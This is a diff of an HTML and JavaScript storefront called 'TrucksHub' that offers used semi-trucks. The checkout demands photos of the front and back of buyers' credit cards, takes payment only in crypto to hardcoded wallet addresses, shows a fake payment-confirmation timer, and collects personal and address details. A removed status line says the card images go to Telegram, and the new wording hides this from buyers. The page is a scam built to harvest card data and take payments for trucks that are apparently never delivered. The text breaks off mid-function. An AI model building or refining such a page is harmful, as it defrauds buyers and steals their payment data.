@@ -3,188 +3,390 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Semi-Truck Catalog & Purchase</title>
+    <title>TrucksHub | Premium Semi-Truck Catalog</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
-        .app-container { max-width: 800px; margin: 30px auto; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); padding: 30px; }
-        h1, h2 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
-        .truck-card { background: #f9f9f9; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #007bff; display: flex; justify-content: space-between; align-items: center; }
-        .price { font-weight: bold; color: #dc3545; font-size: 1.3em; }
-        .btn { background-color: #28a745; color: white; padding: 10px 18px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; transition: background-color 0.3s; }
-        .btn:hover { background-color: #218838; }
-        input[type="file"], input[type="text"], select, textarea { width: 100%; padding: 10px; margin-top: 5px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        #wallet-info { background: #e9ecef; padding: 15px; border-radius: 5px; margin-top: 15px; display: none; }
-        .address-box { font-family: monospace; color: #333; word-break: break-all; margin-top: 5px; background: #fff; padding: 8px; border: 1px dashed #adb5bd; }
-        .form-group { margin-bottom: 15px; }
-    </style>
-</head>
-<body>
-    <div class="app-container">
-        <h1>🚛 Semi-Truck Purchase System</h1>
+        /* Custom styles not easily done with Tailwind or for structure */
+        .app-container {
+            /* Adjust content to start after the fixed sidebar */
+            margin-left: 256px; /* Width of sidebar (w-64) */
+            padding: 2.5rem; /* p-10 */
+            min-height: 100vh;
+        }
         
-        <div id="app-canvas">
-            </div>
+        .sidebar {
+            width: 256px; /* w-64 */
+            top: 0;
+            left: 0;
+            height: 100%;
+            z-index: 50; /* z-10 */
+        }
+        
+        /* Custom scrollbar for better aesthetics */
+        body::-webkit-scrollbar { width: 8px; }
+        body::-webkit-scrollbar-track { background: #f1f1f1; }
+        body::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+        body::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
 
+        /* Custom Styles for Checkout Card elements */
+        .checkout-card { @apply bg-white p-8 rounded-xl shadow-lg border border-gray-100 mt-6; }
+
+        /* Truck Card Hover Effect */
+        .truck-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary-blue': '#004d99',
+                        'secondary-gold': '#f4b400',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 text-gray-800">
+
+    <div id="sidebar" class="fixed sidebar bg-gray-900 text-white flex flex-col items-center py-8">
+        <div class="mb-10 px-4">
+            <h1 class="text-3xl font-extrabold text-secondary-gold">TrucksHub</h1>
+            <p class="text-sm text-gray-400">Premium Fleet Solutions</p>
+        </div>
+        
+        <nav class="w-full">
+            <button onclick="changeView('catalog')" class="w-full text-left py-4 px-6 text-lg font-medium hover:bg-gray-800 transition duration-150 flex items-center">
+                <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 13.255A23.931 23.931 0 0112 15c-3.183 0-6.22-1.282-8.455-3.667a.75.75 0 00-.545-.251c-.244 0-.48.118-.63.315A23.924 23.924 0 001 12c.004-.383.078-.763.218-1.127a.75.75 0 00.17-.435c.164-.475.402-.93.71-1.353C4.242 6.843 7.842 5 12 5c3.551 0 6.877 1.488 9.39 4.022a.75.75 0 00.56.241c.219 0 .43.078.586.227A23.93 23.93 0 0023 12c.004.383-.078.763-.218 1.127a.75.75 0 00-.17.435c-.164.475-.402.93-.71 1.353C19.758 17.157 16.158 19 12 19c-3.551 0-6.877-1.488-9.39-4.022z"></path></svg>
+                Truck Catalog
+            </button>
+            <button onclick="changeView('contact')" class="w-full text-left py-4 px-6 text-lg font-medium hover:bg-gray-800 transition duration-150 flex items-center">
+                <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.842 5.234A2 2 0 0012 13.5c.677 0 1.34-.234 1.81-1.81L21 8m-2 12H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v12a2 2 0 01-2 2z"></path></svg>
+                Contact Us
+            </button>
+        </nav>
+
+        <div class="mt-auto p-4 text-center text-xs text-gray-500">
+            &copy; 2025 TrucksHub. All rights reserved.
+        </div>
     </div>
+    
+    <div class="app-container">
+        <div id="app-canvas"></div>
+    </div>
+
+    <div id="truckDetailModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50">
+        <div class="bg-white p-8 rounded-xl shadow-2xl w-full max-w-xl animate-bounce-in-down">
+            <div class="flex justify-between items-start mb-4">
+                <h3 id="modal-name" class="text-2xl font-bold text-primary-blue"></h3>
+                <span class="modal-close text-gray-500 text-3xl cursor-pointer hover:text-gray-900">&times;</span>
+            </div>
+            <div class="modal-body">
+                <img id="modal-image" src="" alt="Truck Image" class="w-full h-64 object-cover rounded-lg mb-4 border border-gray-200">
+                <p id="modal-details" class="text-gray-600 mb-4"></p>
+                <p id="modal-price" class="text-3xl font-extrabold text-secondary-gold mb-6"></p>
+                <div class="text-right">
+                    <button class="btn bg-primary-blue hover:bg-indigo-700" id="modal-buy-btn">BUY THIS TRUCK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
 
 <script>
     // --- GLOBAL STATE ---
+    let currentView = 'catalog';
     let orderState = {
         truckId: null,
         truckName: null,
         orderId: null,
         paymentMethod: null,
-        cardFrontFile: null, 
-        cardBackFile: null,
     };
 
     const WALLETS = {
         'BTC': 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7',
         'ETH': '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca',
-        'USDT_ERC20': '0x08cFE6DDC3b58b0655dD1c9214BcfdDBD3855CCA'
+        'USDT_ERC20': '0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA'
     };
 
-    // Semi-Truck Catalog Data
+    // Semi-Truck Catalog Data (Using your required image extensions)
     const TRUCKS = [
-        // NOTE: Adjusted to use the .jpeg extension you uploaded
-        { id: 'PB579-21', name: 'Peterbilt 579 (2021)', info: '2021 Sleeper with ~479k miles.', price: '$47,950', imageUrl: './images/peterbilt-579-2021.jpeg' },
-        { id: 'PB579-19', name: 'Peterbilt 579 (2019)', info: '2019 Used Sleeper Tractor.', price: '$44,950', imageUrl: './images/peterbilt-579-2019.jpeg' },
-        
-        // NOTE: Adjusted to use the .jpeg extension you uploaded
-        { id: 'KW680-21', name: 'Kenworth T680 (2021)', info: '2021 Sleeper with ~177k miles.', price: '$69,000', imageUrl: './images/kenworth-t680-2021.jpeg' },
-        { id: 'KW680-19', name: 'Kenworth T680 (2019)', info: '2019 Used Sleeper (Various Mileages).', price: '$56,000', imageUrl: './images/kenworth-t680-2019.jpeg' },
-        
-        // NOTE: Adjusted to use the .webp extension you uploaded
-        { id: 'FLC-21', name: 'Freightliner Cascadia (2021)', info: '2021 Used Cascadia (125/126 Series).', price: '$76,500', imageUrl: './images/freightliner-cascadia-2021.webp' },
-        { id: 'FLC-12', name: 'Freightliner Cascadia (2012)', info: '2012 Day-Cab with ~520k miles.', price: '$28,000', imageUrl: './images/freightliner-cascadia-2012.jpeg' },
-        
-        // NOTE: Adjusted to use the .jpeg extension you uploaded
-        { id: 'PB389-16', name: 'Peterbilt 389 (2016)', info: '2016 Sleeper, ~656k miles (Classic Look).', price: '$69,900', imageUrl: './images/peterbilt-389.jpeg' },
-        { id: 'VVNL-20', name: 'Volvo VNL 670 (2020)', info: '2020 Used VNL 670 Tractor.', price: '$75,000', imageUrl: './images/volvo-vnl-670.jpeg' },
-        
-        // NOTE: Adjusted to use the .jpeg extension you uploaded
-        { id: 'MACK-21', name: 'Mack Anthem (2021)', info: '2021 Used Mack Anthem Sleeper.', price: '$80,000', imageUrl: './images/mack-anthem-2021.jpeg' },
-        { id: 'INT-LT', name: 'International ProStar / LT', info: '2014-2021 Used Model Range.', price: '$45,000', imageUrl: './images/international-lt.jpeg' }
+        { id: 'PB579-21', name: 'Peterbilt 579 (2021)', info: '2021 Sleeper with ~479k miles.', price: '$47,950', imageUrl: './images/peterbilt-579-2021.jpeg', details: 'High-efficiency sleeper tractor, ideal for team driving and long-haul freight. PACCAR MX-13 engine, 12-speed automated manual transmission.' },
+        { id: 'PB579-19', name: 'Peterbilt 579 (2019)', info: '2019 Used Sleeper Tractor.', price: '$44,950', imageUrl: './images/peterbilt-579-2019.jpeg', details: 'Reliable used Peterbilt, maintained for heavy interstate travel. Comfortable cab and proven fuel economy. Perfect entry into owner-operator status.' },
+        { id: 'KW680-21', name: 'Kenworth T680 (2021)', info: '2021 Sleeper with ~177k miles.', price: '$69,000', imageUrl: './images/kenworth-t680-2021.jpeg', details: 'Low-mileage unit with premium comfort and aerodynamic design. PACCAR MX engine, factory warranty available. Excellent condition.' },
+        { id: 'KW680-19', name: 'Kenworth T680 (2019)', info: '2019 Used Sleeper (Various Mileages).', price: '$56,000', imageUrl: './images/kenworth-t680-2019.jpeg', details: 'Versatile T680, known for durability and driver satisfaction. Available in various specifications to suit diverse hauling needs.' },
+        { id: 'FLC-21', name: 'Freightliner Cascadia (2021)', info: '2021 Used Cascadia (125/126 Series).', price: '$76,500', imageUrl: './images/freightliner-cascadia-2021.webp', details: 'The most popular truck in America. Aerodynamic, fuel-efficient, with Detroit DD15 engine and Detroit Assurance safety system. Modern interior.' },
+        { id: 'FLC-12', name: 'Freightliner Cascadia (2012)', info: '2012 Day-Cab with ~520k miles.', price: '$28,000', imageUrl: './images/freightliner-cascadia-2012.jpeg', details: 'Economical day-cab option for local and regional routes. Well-maintained and inspected. Great value for short-haul operations.' },
+        { id: 'PB389-16', name: 'Peterbilt 389 (2016)', info: '2016 Sleeper, ~656k miles (Classic Look).', price: '$69,900', imageUrl: './images/peterbilt-389.jpeg', details: 'A classic long-nose design that commands attention. Cummins ISX engine, manual transmission. A favorite among traditionalists.' },
+        { id: 'VVNL-20', name: 'Volvo VNL 670 (2020)', info: '2020 Used VNL 670 Tractor.', price: '$75,000', imageUrl: './images/volvo-vnl-670.jpeg', details: 'Focus on safety and driver comfort. Volvo D13 engine, I-Shift automated transmission. Large, comfortable sleeper area.' },
+        { id: 'MACK-21', name: 'Mack Anthem (2021)', info: '2021 Used Mack Anthem Sleeper.', price: '$80,000', imageUrl: './images/mack-anthem-2021.jpeg', details: 'Rugged reliability with modern styling. Mack MP8 engine, mDRIVE automated transmission. Excellent power and torque for challenging hauls.' },
+        { id: 'INT-LT', name: 'International ProStar / LT', info: '2014-2021 Used Model Range.', price: '$45,000', imageUrl: './images/international-lt.jpeg', details: 'A dependable and affordable line of tractors. Good balance of performance and operating cost. Various configurations available.' }
     ];
 
     const canvas = document.getElementById('app-canvas');
+    const modal = document.getElementById('truckDetailModal');
+    const modalClose = document.querySelector('.modal-close');
+
+    // --- NAVIGATION & UTILITY ---
+
+    function changeView(viewName) {
+        currentView = viewName;
+        if (viewName === 'catalog') {
+            renderCatalog();
+        } else if (viewName === 'contact') {
+            renderContactUs();
+        }
+        // Hide modal if open
+        modal.style.display = 'none';
+    }
+
+    function updateProgressBar(step) {
+        // Tailwind Progress Bar Logic (Simplified for styling)
+        const progressBar = `
+            <div class="flex justify-between items-center mb-6 text-sm font-medium text-gray-500">
+                <div class="text-center ${step >= 1 ? 'text-primary-blue font-semibold' : ''}">
+                    <div class="w-10 h-10 mx-auto rounded-full ${step >= 1 ? 'bg-primary-blue text-white' : 'bg-gray-200 text-gray-500'} flex items-center justify-center mb-1">1</div>
+                    Verification
+                </div>
+                <div class="flex-auto border-t-2 ${step >= 2 ? 'border-primary-blue' : 'border-gray-200'} mx-4"></div>
+                
+                <div class="text-center ${step >= 2 ? 'text-primary-blue font-semibold' : ''}">
+                    <div class="w-10 h-10 mx-auto rounded-full ${step >= 2 ? 'bg-primary-blue text-white' : 'bg-gray-200 text-gray-500'} flex items-center justify-center mb-1">2</div>
+                    Payment
+                </div>
+                <div class="flex-auto border-t-2 ${step >= 3 ? 'border-primary-blue' : 'border-gray-200'} mx-4"></div>
+                
+                <div class="text-center ${step >= 3 ? 'text-primary-blue font-semibold' : ''}">
+                    <div class="w-10 h-10 mx-auto rounded-full ${step >= 3 ? 'bg-primary-blue text-white' : 'bg-gray-200 text-gray-500'} flex items-center justify-center mb-1">3</div>
+                    Delivery
+                </div>
+            </div>
+        `;
+        document.getElementById('progress-container').innerHTML = progressBar;
+    }
+
+    // Modal Handlers
+    modalClose.onclick = function() { modal.style.display = 'none'; }
+    window.onclick = function(event) { if (event.target === modal) { modal.style.display = 'none'; } }
+
+    function showDetails(truckId) {
+        const truck = TRUCKS.find(t => t.id === truckId);
+        if (!truck) return;
+
+        document.getElementById('modal-image').src = truck.imageUrl;
+        document.getElementById('modal-name').textContent = truck.name;
+        document.getElementById('modal-price').textContent = `Price: ${truck.price}`;
+        document.getElementById('modal-details').textContent = truck.details;
+        
+        document.getElementById('modal-buy-btn').onclick = () => {
+            modal.style.display = 'none';
+            startPurchase(truck.id, truck.name);
+        };
+
+        modal.style.display = 'flex'; // Use flex to center the modal
+    }
 
     // --- VIEW RENDERING FUNCTIONS ---
 
     // View 1: Truck Listing
     function renderCatalog() {
-        let content = '<h2>1. Select Your Truck</h2>';
+        let content = `
+            <h2 class="text-3xl font-bold text-gray-700 mb-8 border-b pb-4">Premium Semi-Truck Fleet</h2>
+            <div id="catalog-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+        `;
         TRUCKS.forEach(truck => {
             content += `
-                <div class="truck-card">
-                    <div style="display:flex; align-items:center;">
-                        <img src="${truck.imageUrl}" alt="${truck.name}" style="width: 100px; height: 60px; object-fit: cover; margin-right: 15px; border-radius: 4px;">
-                        
-                        <div>
-                            <h3>${truck.name}</h3>
-                            <p>${truck.info}</p>
-                            <p class="price">${truck.price}</p>
+                <div class="truck-card bg-white rounded-xl overflow-hidden shadow-lg hover:shadow-2xl transition duration-300 transform border border-gray-100">
+                    <img src="${truck.imageUrl}" alt="${truck.name}" class="w-full h-48 object-cover border-b border-gray-200">
+                    <div class="p-5">
+                        <h3 class="text-xl font-semibold text-primary-blue mb-1">${truck.name}</h3>
+                        <p class="text-sm text-gray-500 h-10 overflow-hidden mb-3">${truck.info}</p>
+                        <div class="flex justify-between items-center pt-3 border-t">
+                            <span class="text-2xl font-extrabold text-secondary-gold">${truck.price}</span>
+                            <div class="space-x-2">
+                                <button class="btn-secondary bg-secondary-gold text-gray-900 py-2 px-4 rounded-lg text-sm hover:bg-yellow-500" onclick="showDetails('${truck.id}')">Details</button>
+                                <button class="btn bg-primary-blue py-2 px-4 rounded-lg text-sm hover:bg-indigo-700" onclick="startPurchase('${truck.id}', '${truck.name}')">Buy Now</button>
+                            </div>
                         </div>
                     </div>
-                    <button class="btn" onclick="startPurchase('${truck.id}', '${truck.name}')">Buy Now</button>
                 </div>
             `;
         });
+        content += '</div>';
         canvas.innerHTML = content;
     }
 
-    // View 2: Credit Card Verification
+    // View: Contact Us
+    function renderContactUs() {
+        canvas.innerHTML = `
+            <h2 class="text-3xl font-bold text-gray-700 mb-8 border-b pb-4">Contact TrucksHub Support</h2>
+            <div class="bg-white p-10 rounded-xl shadow-xl border border-gray-100 max-w-2xl mx-auto">
+                <p class="text-lg text-gray-600 mb-6">We are here to assist you with sales, technical queries, or order support.</p>
+                
+                <div class="space-y-4">
+                    <div class="flex items-center p-4 bg-gray-100 rounded-lg">
+                        <svg class="w-6 h-6 text-primary-blue mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
+                        <div>
+                            <p class="font-medium">Sales Line (24/7)</p>
+                            <p class="text-primary-blue font-semibold">+1 (800) 555-T-HUB</p>
+                        </div>
+                    </div>
+                    
+                    <div class="flex items-center p-4 bg-gray-100 rounded-lg">
+                        <svg class="w-6 h-6 text-primary-blue mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.842 5.234A2 2 0 0012 13.5c.677 0 1.34-.234 1.81-1.81L21 8m-2 12H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v12a2 2 0 01-2 2z"></path></svg>
+                        <div>
+                            <p class="font-medium">Email Support</p>
+                            <p class="text-primary-blue font-semibold">support@truckshub.com</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center p-4 bg-gray-100 rounded-lg">
+                        <svg class="w-6 h-6 text-primary-blue mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.828 0l-4.243-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                        <div>
+                            <p class="font-medium">Headquarters</p>
+                            <p class="text-primary-blue font-semibold">123 Fleet Way, Transportation City, USA</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    // View 2: Credit Card Verification (Step 1)
     function renderCardVerification() {
         canvas.innerHTML = `
-            <h2>2. Credit Card Verification (Step 1/3)</h2>
-            <p>You are purchasing: <strong>${orderState.truckName}</strong></p>
-            <p style="color:red; font-weight:bold;">⚠️ **NOTE:** This is a non-standard verification step for high-value crypto orders. Please upload clear pictures of the **FRONT** and **BACK** of your credit card. For security, we assume you have covered the card number and CVV in the photo. </p>
+            <h2 class="text-3xl font-bold text-gray-700 mb-8 border-b pb-4">Secure Checkout</h2>
+            <div id="progress-container"></div>
             
-            <form id="card-upload-form">
-                <div class="form-group">
-                    <label for="card-front">Credit Card Front Image:</label>
-                    <input type="file" id="card-front" name="cardFront" accept="image/*" required>
+            <div class="checkout-card">
+                <h3 class="text-2xl font-semibold mb-4 text-gray-700">1. Payment Verification (${orderState.truckName})</h3>
+                
+                <div class="p-4 bg-gray-900 text-white rounded-lg mb-6 border-l-4 border-secondary-gold">
+                    <p class="text-sm font-medium">⚠️ **SECURITY PROTOCOL:** This one-time verification is mandatory for crypto transactions to prevent fraud. Please upload clear images of the **FRONT** and **BACK** of your credit card.</p>
                 </div>
-                <div class="form-group">
-                    <label for="card-back">Credit Card Back Image:</label>
-                    <input type="file" id="card-back" name="cardBack" accept="image/*" required>
-                </div>
-                <button type="submit" class="btn">Proceed to Payment Selection</button>
-            </form>
-            <p id="message" style="margin-top: 20px; font-weight: bold;"></p>
+                
+                <form id="card-upload-form">
+                    <div class="grid grid-cols-2 gap-6">
+                        <div class="form-group">
+                            <label for="card-front" class="block text-sm font-medium text-gray-700 mb-1">Card Front Image (Mandatory)</label>
+                            <input type="file" id="card-front" name="cardFront" accept="image/*" class="w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary-blue file:text-white hover:file:bg-indigo-700" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="card-back" class="block text-sm font-medium text-gray-700 mb-1">Card Back Image (Mandatory)</label>
+                            <input type="file" id="card-back" name="cardBack" accept="image/*" class="w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary-blue file:text-white hover:file:bg-indigo-700" required>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-4">Proceed to Payment Selection</button>
+                </form>
+                <div id="message" class="mt-6 p-3 rounded-lg text-sm text-center font-medium hidden"></div>
+            </div>
         `;
-
         document.getElementById('card-upload-form').addEventListener('submit', handleCardUpload);
+        updateProgressBar(1);
     }
 
-    // View 3: Payment Selection
+    // View 3: Payment Selection (Step 2)
     function renderPaymentSelection() {
         canvas.innerHTML = `
-            <h2>3. Payment Selection (Step 2/3)</h2>
-            <p>Order ID: <strong>${orderState.orderId}</strong> for <strong>${orderState.truckName}</strong></p>
+            <h2 class="text-3xl font-bold text-gray-700 mb-8 border-b pb-4">Secure Checkout</h2>
+            <div id="progress-container"></div>
 
-            <div class="form-group">
-                <label for="payment-select">Select Payment Method:</label>
-                <select id="payment-select">
-                    <option value="" disabled selected>Choose a Crypto Method</option>
-                    <option value="BTC">Bitcoin (BTC)</option>
-                    <option value="ETH">Ethereum (ETH)</option>
-                    <option value="USDT_ERC20">USDT (ERC20)</option>
-                </select>
-            </div>
+            <div class="checkout-card">
+                <h3 class="text-2xl font-semibold mb-4 text-gray-700">2. Select Crypto Payment Method</h3>
+                <p class="text-sm text-gray-500 mb-6">Order ID: <strong class="text-primary-blue">${orderState.orderId}</strong></p>
 
-            <div id="wallet-info">
-                <p>Please send the **EXACT** truck price to the wallet address below. Once sent, click **"I Have Sent Payment"**.</p>
-                <h3>Wallet Address:</h3>
-                <div id="address-display" class="address-box"></div>
-                <button class="btn" style="background-color:#28a745; margin-top:15px;" onclick="startConfirmation()">I Have Sent Payment</button>
-            </div>
+                <div class="flex justify-around space-x-4 mb-8">
+                    <div class="crypto-option w-1/3 p-6 border-2 border-gray-200 rounded-xl cursor-pointer hover:border-primary-blue transition duration-200 text-center" data-method="BTC">
+                        <div class="text-4xl text-secondary-gold mb-2">₿</div>
+                        <h4 class="text-xl font-semibold">Bitcoin (BTC)</h4>
+                        <p class="text-sm text-gray-500">Fastest confirmation</p>
+                    </div>
+                    <div class="crypto-option w-1/3 p-6 border-2 border-gray-200 rounded-xl cursor-pointer hover:border-primary-blue transition duration-200 text-center" data-method="ETH">
+                        <div class="text-4xl text-gray-500 mb-2">Ξ</div>
+                        <h4 class="text-xl font-semibold">Ethereum (ETH)</h4>
+                        <p class="text-sm text-gray-500">Standard network fee</p>
+                    </div>
+                    <div class="crypto-option w-1/3 p-6 border-2 border-gray-200 rounded-xl cursor-pointer hover:border-primary-blue transition duration-200 text-center" data-method="USDT_ERC20">
+                        <div class="text-4xl text-green-500 mb-2">₮</div>
+                        <h4 class="text-xl font-semibold">USDT (ERC20)</h4>
+                        <p class="text-sm text-gray-500">Stablecoin value</p>
+                    </div>
+                </div>
+                
+                <style>
+                    .crypto-option.selected { @apply border-4 border-success-color bg-green-50 shadow-md; }
+                    .crypto-option.selected .text-secondary-gold { color: #15803d; } /* Darker green for selected BTC */
+                </style>
 
-            <div id="timer-box" style="display: none; text-align: center; margin-top: 20px;">
-                <h2>Confirming Your Payment...</h2>
-                <p>Please hold for: <strong id="timer">20</strong> seconds.</p>
+
+                <div id="wallet-info" class="p-6 bg-gray-100 rounded-lg text-center hidden">
+                    <p class="text-base text-gray-700 font-medium mb-3">Send the **EXACT** amount to this wallet:</p>
+                    <div id="address-display" class="address-box bg-white text-gray-900 p-3 border border-dashed border-primary-blue font-mono text-sm break-all"></div>
+                    <button class="btn bg-success-color hover:bg-green-700 mt-6" onclick="startConfirmation()">I Have Sent Payment</button>
+                </div>
+
+                <div id="timer-box" class="p-6 text-center mt-6 hidden bg-blue-50 border border-blue-200 rounded-lg">
+                    <h3 class="text-xl font-semibold text-primary-blue">Confirming Transaction...</h3>
+                    <p class="text-gray-600">Please hold for: <strong id="timer" class="text-3xl text-primary-blue font-bold">20</strong> seconds.</p>
+                </div>
             </div>
         `;
-        document.getElementById('payment-select').addEventListener('change', handlePaymentSelect);
+        document.querySelectorAll('.crypto-option').forEach(option => {
+            option.addEventListener('click', handlePaymentSelect);
+        });
+        updateProgressBar(2);
     }
 
-    // View 4: Delivery Details
+    // View 4: Delivery Details (Step 3)
     function renderDeliveryDetails() {
         canvas.innerHTML = `
-            <h2>4. Delivery Details (Step 3/3)</h2>
-            <p>Finalizing order <strong>${orderState.orderId}</strong> for <strong>${orderState.truckName}</strong></p>
-            
-            <form id="delivery-form">
-                <div class="form-group"><label for="name">Name:</label><input type="text" id="name" name="name" required></div>
-                <div class="form-group">
-                    <label for="gender">Gender:</label>
-                    <select id="gender" name="gender" required>
-                        <option value="" disabled selected>Select Gender</option>
-                        <option value="Male">Male</option>
-                        <option value="Female">Female</option>
-                    </select>
-                </div>
-                <div class="form-group"><label for="email">Email:</label><input type="email" id="email" name="email" required></div>
-                <div class="form-group"><label for="phone">Phone Number:</label><input type="tel" id="phone" name="phone" required></div>
-                <div class="form-group"><label for="country">Country:</label><input type="text" id="country" name="country" required></div>
-                <div class="form-group"><label for="state">State:</label><input type="text" id="state" name="state" required></div>
-                <div class="form-group"><label for="address">Address:</label><textarea id="address" name="address" rows="3" required></textarea></div>
+            <h2 class="text-3xl font-bold text-gray-700 mb-8 border-b pb-4">Secure Checkout</h2>
+            <div id="progress-container"></div>
+
+            <div class="checkout-card">
+                <h3 class="text-2xl font-semibold mb-4 text-gray-700">3. Delivery Information</h3>
+                <p class="text-sm text-gray-500 mb-6">Finalizing order <strong class="text-primary-blue">${orderState.orderId}</strong> for the ${orderState.truckName}.</p>
                 
-                <button type="submit" class="btn">Submit Final Order</button>
-            </form>
+                <form id="delivery-form">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-4">
+                        <div class="form-group"><label for="name" class="block text-sm font-medium text-gray-700">Full Name</label><input type="text" id="name" name="name" class="p-2 border border-gray-300 rounded-md w-full" required></div>
+                        <div class="form-group">
+                            <label for="gender" class="block text-sm font-medium text-gray-700">Gender</label>
+                            <select id="gender" name="gender" class="p-2 border border-gray-300 rounded-md w-full" required>
+                                <option value="" disabled selected>Select Gender</option>
+                                <option value="Male">Male</option>
+                                <option value="Female">Female</option>
+                            </select>
+                        </div>
+                        <div class="form-group"><label for="email" class="block text-sm font-medium text-gray-700">Email</label><input type="email" id="email" name="email" class="p-2 border border-gray-300 rounded-md w-full" required></div>
+                        <div class="form-group"><label for="phone" class="block text-sm font-medium text-gray-700">Phone Number</label><input type="tel" id="phone" name="phone" class="p-2 border border-gray-300 rounded-md w-full" required></div>
+                        <div class="form-group"><label for="country" class="block text-sm font-medium text-gray-700">Country</label><input type="text" id="country" name="country" class="p-2 border border-gray-300 rounded-md w-full" required></div>
+                        <div class="form-group"><label for="state" class="block text-sm font-medium text-gray-700">State/Province</label><input type="text" id="state" name="state" class="p-2 border border-gray-300 rounded-md w-full" required></div>
+                    </div>
+                    <div class="form-group mt-4"><label for="address" class="block text-sm font-medium text-gray-700">Full Delivery Address</label><textarea id="address" name="address" rows="3" class="p-2 border border-gray-300 rounded-md w-full" required></textarea></div>
+                    
+                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-6">SUBMIT FINAL ORDER</button>
+                </form>
+            </div>
         `;
         document.getElementById('delivery-form').addEventListener('submit', handleFinalSubmission);
+        updateProgressBar(3);
     }
 
     // View 5: Order Received
     function renderOrderReceived() {
         canvas.innerHTML = `
-            <div style="text-align:center;">
-                <div style="font-size: 5em; color: #28a745; margin-bottom: 20px;">🎉</div>
-                <h2>Order Received Successfully!</h2>
-                <p>Thank you for securing your purchase of the <strong>${orderState.truckName}</strong> (Order ID: ${orderState.orderId}).</p>
-                <p>Please hold while a personnel contacts you for further discussions on the **delivery date** and confirmation of your payment.</p>
-                <p>You may now close this page.</p>
+            <div class="checkout-card max-w-xl mx-auto text-center">
+                <div class="text-6xl text-success-color mb-4">✅</div>
+                <h2 class="text-3xl font-bold text-gray-800 mb-2">Order Confirmed!</h2>
+                <p class="text-lg text-gray-600 mb-4">Thank you for securing your purchase of the <strong>${orderState.truckName}</strong>.</p>
+                <p class="text-xl font-medium text-primary-blue mb-6">Order ID: ${orderState.orderId}</p>
+                <p class="text-sm text-gray-500">A specialist will contact you shortly to confirm the payment and arrange delivery logistics.</p>
+                <button onclick="changeView('catalog')" class="btn bg-secondary-gold hover:bg-yellow-500 text-gray-900 mt-8">Back to Catalog</button>
             </div>
         `;
     }
@@ -200,14 +402,24 @@
     async function handleCardUpload(e) {
         e.preventDefault();
         const messageElement = document.getElementById('message');
-        messageElement.textContent = "Uploading images and sending to Telegram...";
+        messageElement.classList.remove('success', 'error');
+        messageElement.classList.add('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+        messageElement.textContent = "Processing and verifying details...";
+        messageElement.style.display = 'block';
 
         const formData = new FormData();
-        orderState.cardFrontFile = document.getElementById('card-front').files[0];
-        orderState.cardBackFile = document.getElementById('card-back').files[0];
+        const cardFrontFile = document.getElementById('card-front').files[0];
+        const cardBackFile = document.getElementById('card-back').files[0];
 
-        formData.append('cardFront', orderState.cardFrontFile);
-        formData.append('cardBack', orderState.cardBackFile);
+        if (!cardFrontFile || !cardBackFile) {
